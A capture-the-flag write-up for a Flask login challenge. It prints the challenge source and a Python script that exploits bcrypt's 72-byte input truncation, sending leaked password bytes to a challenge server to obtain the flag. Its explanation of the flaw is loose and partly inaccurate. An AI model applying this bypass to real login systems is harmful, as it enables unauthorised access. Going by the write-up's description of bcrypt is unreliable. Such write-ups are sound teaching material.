## Question
To 'B' secure or to 'b' fail? Strong passwords for admins are always great, right?

## Solution
Here we've been given a website with a username and password category.
![image](https://github.com/user-attachments/assets/d25ce2a0-ed09-4f0c-a079-0d25cadab51c)

writing `/source` to the url, we get the source code.
```python
from flask import Flask, request, redirect, render_template_string
import sys
import os
import bcrypt
import urllib.parse
app = Flask(__name__) 
app.secret_key = os.urandom(16)
# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())
# >>> strongpw[:71]
b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK' 
FLAG = open("flag.txt").read()
@app.route('/source') 
def source():
    return open(__file__).read() @app.route('/', methods=["GET"]) 
def index():
    username = request.form.get("username", None) 
    password = request.form.get("password", None) 
    if username and password:
        username = urllib.parse.unquote_to_bytes(username) 
        password = urllib.parse.unquote_to_bytes(password)
    if username != b"admin": 
        return "Wrong user!" 
    if len(password) > 128:
        return "Password too long!" 
    if not bcrypt.checkpw(password, app.ADMIN_PW_HASH):
        return "Wrong password!"
    return f"""Congrats! It appears you have successfully bf'ed the password. Here is your {FLAG}"""
    # Use f-string formatting within the template string template_string = """
```

Now there's a vulnerability in bcrypt where it doesn't bother password checking if the password is too long.
Since the actual password is too long and it would take too long to get the correct password, we use the first 70 bytes they've given in the source code and we do a GET request and we get the flag.
```python
import requests
import urllib.parse

url = "http://52.59.124.14:5013/"
username = b'admin'
password = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76\xaa'
username = urllib.parse.quote(username)
password = urllib.parse.quote(password)
data = {
    "username": username,
    "password": password
}

response = requests.get(url, data=data)
print(response.text)
```
`flag: ENO{BCRYPT_FAILS_TO_B_COOL_IF_THE_PW_IS_TOO_LONG}`
